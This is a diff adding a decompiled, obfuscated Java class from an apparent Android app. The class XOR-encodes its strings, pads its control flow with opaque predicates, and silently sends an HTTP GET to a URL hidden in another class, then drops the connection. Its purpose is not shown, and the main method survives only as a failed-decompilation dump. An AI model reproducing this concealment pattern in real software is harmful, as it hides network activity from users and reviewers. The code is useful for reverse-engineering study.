@@ -1,0 +1,191 @@
+package c.a.a;
+/* JADX INFO: Access modifiers changed from: package-private */
+/* loaded from: classes.dex */
+public class y implements Runnable {
+
+    /* renamed from: a  reason: collision with root package name */
+    private final g f60a;
+    private static int[] ao = {82143634, 58712880, 30795760, 23192365, 11087018, 97599120, 65596213};
+    private static int[] an = {50515594, 88180489, 97068774, 91775456};
+
+    /* JADX INFO: Access modifiers changed from: package-private */
+    public y(g gVar) {
+        this.f60a = gVar;
+    }
+
+    private static String r(String str) {
+        int i;
+        StringBuilder sb = new StringBuilder();
+        char[] charArray = str.toCharArray();
+        for (int i2 = 0; i2 < charArray.length; i2++) {
+            switch (i2 % 4) {
+                case 0:
+                    sb.append((char) (charArray[i2] ^ 9479));
+                    int i3 = an[1];
+                    if (i3 >= 0) {
+                        do {
+                        } while (i3 % (63108893 ^ i3) <= 0);
+                        break;
+                    } else {
+                        break;
+                    }
+                case 1:
+                    sb.append((char) (charArray[i2] ^ 65143));
+                    int i4 = an[2];
+                    if (i4 >= 0) {
+                        do {
+                            i = i4 % (60381487 ^ i4);
+                            i4 = 97068774;
+                        } while (i != 97068774);
+                        break;
+                    } else {
+                        break;
+                    }
+                case 2:
+                    sb.append((char) (charArray[i2] ^ 18041));
+                    int i5 = an[3];
+                    if (i5 >= 0) {
+                        do {
+                        } while ((i5 & (80423498 ^ i5)) <= 0);
+                        break;
+                    } else {
+                        break;
+                    }
+                default:
+                    sb.append((char) (charArray[i2] ^ 65535));
+                    int i6 = an[0];
+                    if (i6 >= 0 && i6 % (87802531 ^ i6) != 50515594) {
+                    }
+                    break;
+            }
+        }
+        return sb.toString();
+    }
+
+    /*  JADX ERROR: JadxRuntimeException in pass: BlockProcessor
+        jadx.core.utils.exceptions.JadxRuntimeException: Found unreachable blocks
+        	at jadx.core.dex.visitors.blocks.DominatorTree.sortBlocks(DominatorTree.java:35)
+        	at jadx.core.dex.visitors.blocks.DominatorTree.compute(DominatorTree.java:25)
+        	at jadx.core.dex.visitors.blocks.BlockProcessor.computeDominators(BlockProcessor.java:202)
+        	at jadx.core.dex.visitors.blocks.BlockProcessor.processBlocksTree(BlockProcessor.java:45)
+        	at jadx.core.dex.visitors.blocks.BlockProcessor.visit(BlockProcessor.java:39)
+        */
+    @Override // java.lang.Runnable
+    public void run() {
+        /*
+            r9 = this;
+        L0:
+            r3 = r9
+            java.net.URL r0 = new java.net.URL     // Catch: java.io.IOException -> Ld9
+            java.lang.String r1 = c.a.a.b.k     // Catch: java.io.IOException -> Ld9
+            r0.<init>(r1)     // Catch: java.io.IOException -> Ld9
+            java.net.URLConnection r0 = r0.openConnection()     // Catch: java.io.IOException -> Ld9
+            java.net.HttpURLConnection r0 = (java.net.HttpURLConnection) r0     // Catch: java.io.IOException -> Ld9
+            java.lang.String r1 = "╀︲䘭"
+            java.lang.String r1 = r(r1)     // Catch: java.io.IOException -> Ld9
+            java.lang.String r1 = r1.intern()     // Catch: java.io.IOException -> Ld9
+            r0.setRequestMethod(r1)     // Catch: java.io.IOException -> Ld9
+            int[] r5 = c.a.a.y.ao     // Catch: java.io.IOException -> Ld9
+            r6 = 0
+            r6 = r5[r6]     // Catch: java.io.IOException -> Ld9
+            if (r6 < 0) goto L30
+            r5 = 94146272(0x59c8ee0, float:1.4722653E-35)
+        L28:
+            r5 = r5 ^ r6
+            r5 = r6 & r5
+            if (r5 == 0) goto L0
+            goto L30
+            goto L28
+        L30:
+            r1 = 1
+            r0.setInstanceFollowRedirects(r1)     // Catch: java.io.IOException -> Ld9
+            int[] r5 = c.a.a.y.ao     // Catch: java.io.IOException -> Ld9
+            r6 = 1
+            r6 = r5[r6]     // Catch: java.io.IOException -> Ld9
+            if (r6 < 0) goto L47
+        L3d:
+            r5 = 6054053(0x5c60a5, float:8.483535E-39)
+            r5 = r5 ^ r6
+            r5 = r6 & r5
+            if (r5 > 0) goto L47
+            goto L3d
+        L47:
+            r1 = 100
+            r0.setConnectTimeout(r1)     // Catch: java.io.IOException -> Ld9
+            int[] r5 = c.a.a.y.ao     // Catch: java.io.IOException -> Ld9
+            r6 = 2
+            r6 = r5[r6]     // Catch: java.io.IOException -> Ld9
+            if (r6 < 0) goto L60
+            r5 = 46882024(0x2cb5ce8, float:2.9881495E-37)
+        L58:
+            r5 = r5 ^ r6
+            int r5 = r6 % r5
+            if (r5 == 0) goto L0
+            goto L60
+            goto L58
+        L60:
+            r1 = 100
+            r0.setReadTimeout(r1)     // Catch: java.io.IOException -> Ld9
+            int[] r5 = c.a.a.y.ao     // Catch: java.io.IOException -> Ld9
+            r6 = 3
+            r6 = r5[r6]     // Catch: java.io.IOException -> Ld9
+            if (r6 < 0) goto L7b
+            r5 = 91871002(0x579d71a, float:1.1747432E-35)
+            r5 = r5 ^ r6
+            int r5 = r6 % r5
+            r6 = 23192365(0x161e32d, float:4.1488964E-38)
+            if (r5 != r6) goto L7b
+            goto L7b
+        L7b:
+            java.lang.String r1 = "╄︘䘗ﾑ╢︔䘍ﾖ╨︙"
+            java.lang.String r1 = r(r1)     // Catch: java.io.IOException -> Ld9
+            java.lang.String r1 = r1.intern()     // Catch: java.io.IOException -> Ld9
+            java.lang.String r2 = "╤\ufe1b䘖ﾌ╢"
+            java.lang.String r2 = r(r2)     // Catch: java.io.IOException -> Ld9
+            java.lang.String r2 = r2.intern()     // Catch: java.io.IOException -> Ld9
+            r0.setRequestProperty(r1, r2)     // Catch: java.io.IOException -> Ld9
+            int[] r5 = c.a.a.y.ao     // Catch: java.io.IOException -> Ld9
+            r6 = 4
+            r6 = r5[r6]     // Catch: java.io.IOException -> Ld9
+            if (r6 < 0) goto La8
+        L9b:
+            r5 = 9092689(0x8abe51, float:1.2741571E-38)
+            r5 = r5 ^ r6
+            int r5 = r6 % r5
+            r6 = 1761470(0x1ae0be, float:2.468345E-39)
+            if (r5 == r6) goto La8
+            goto L9b
+        La8:
+            r0.connect()     // Catch: java.io.IOException -> Ld9
+            int[] r5 = c.a.a.y.ao     // Catch: java.io.IOException -> Ld9
+            r6 = 5
+            r6 = r5[r6]     // Catch: java.io.IOException -> Ld9
+            if (r6 < 0) goto Lc1
+            r5 = 77212074(0x49a29aa, float:3.624349E-36)
+            r5 = r5 ^ r6
+            int r5 = r6 % r5
+            r6 = 10805672(0xa4e1a8, float:1.5141972E-38)
+            if (r5 != r6) goto Lc1
+            goto Lc1
+        Lc1:
+            r0.disconnect()     // Catch: java.io.IOException -> Ld9
+            int[] r5 = c.a.a.y.ao     // Catch: java.io.IOException -> Ld9
+            r6 = 6
+            r6 = r5[r6]     // Catch: java.io.IOException -> Ld9
+            if (r6 < 0) goto Ld8
+            r5 = 6505662(0x6344be, float:9.116374E-39)
+        Ld0:
+            r5 = r5 ^ r6
+            int r5 = r6 % r5
+            if (r5 == 0) goto L0
+            goto Ld8
+            goto Ld0
+        Ld8:
+            return
+        Ld9:
+            r0 = move-exception
+            goto Ld8
+        */
+        throw new UnsupportedOperationException("Method not decompiled: c.a.a.y.run():void");
+    }
+}
